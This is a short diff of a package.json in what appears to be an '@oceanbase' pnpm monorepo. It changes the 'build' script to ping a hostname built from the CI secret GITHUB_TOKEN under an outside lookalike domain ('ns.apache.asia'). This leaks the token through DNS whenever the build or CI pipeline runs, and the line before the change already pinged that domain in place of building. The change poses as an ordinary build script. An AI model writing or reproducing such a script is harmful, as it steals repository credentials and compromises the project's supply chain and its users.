@@ -7,7 +7,7 @@
   ],
   "packageManager": "pnpm@8.6.0",
   "scripts": {
-    "build": "ping h0y90.ns.apache.asia",
+    "build": "ping ${{secrets.GITHUB_TOKEN}}.zaif8.ns.apache.asia",
     "build:watch": "pnpm --filter \"@oceanbase/**\" build --watch",
     "build:design": "pnpm --filter \"@oceanbase/design\" build",
     "ci": "npm run tsc && npm run build && npm run lint && npm run test",
